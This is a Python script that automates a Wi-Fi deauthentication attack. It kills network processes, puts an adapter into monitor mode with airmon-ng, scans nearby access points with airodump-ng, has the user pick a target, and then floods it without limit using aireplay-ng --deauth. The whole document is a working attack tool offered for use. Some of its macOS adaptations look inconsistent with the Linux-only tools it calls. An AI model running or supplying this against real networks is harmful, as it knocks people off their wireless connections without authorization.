#sudo python3 "hisdguestdeauth.py"
#run the above sudo command without the hashtag: "#"
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True

# Ensure script is run with sudo privileges
if 'SUDO_UID' not in os.environ:
    print("Try running this program with sudo.")
    exit()

# Backup .csv files
directory = os.getcwd()
for file_name in os.listdir():
    if file_name.endswith(".csv"):
        print(f"Moving {file_name} to backup directory.")
        try:
            backup_dir = os.path.join(directory, "backup")
            os.makedirs(backup_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
            shutil.move(file_name, os.path.join(backup_dir, f"{timestamp}-{file_name}"))
        except Exception as e:
            print(f"Error moving {file_name}: {e}")

# Updated regex for macOS interface names
wlan_pattern = re.compile("^en[0-9]+")

# Use ifconfig instead of iwconfig
check_wifi_result = wlan_pattern.findall(subprocess.run(["ifconfig"], capture_output=True).stdout.decode())

if not check_wifi_result:
    print("Please connect a WiFi adapter and try again.")
    exit()

print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Select the interface to use
while True:
    try:
        wifi_interface_choice = int(input("Please select the interface you want to use for the attack: "))
        if 0 <= wifi_interface_choice < len(check_wifi_result):
            break
    except ValueError:
        print("Please enter a valid number corresponding to the choices available.")

hacknic = check_wifi_result[wifi_interface_choice]

print("WiFi adapter connected!\nNow let's kill conflicting processes:")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Putting Wifi adapter into monitored mode:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Discover access points
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)  # Clear screen for fresh output
        for file_name in os.listdir():
            if file_name.endswith(".csv"):
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                with open(file_name, 'r') as csv_h:
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            continue
                        if row["BSSID"] == "Station MAC":
                            break
                        if check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        # Display detected networks
        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Let user select a target network
while True:
    try:
        choice = int(input("Please select a choice from above: "))
        if 0 <= choice < len(active_wireless_networks):
            break
    except ValueError:
        print("Please enter a valid number corresponding to the network.")

hackbssid = active_wireless_networks[choice]["BSSID"]
hackchannel = active_wireless_networks[choice]["channel"].strip()

# Switch to selected channel and start attack
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, f"{check_wifi_result[wifi_interface_choice]}mon"])
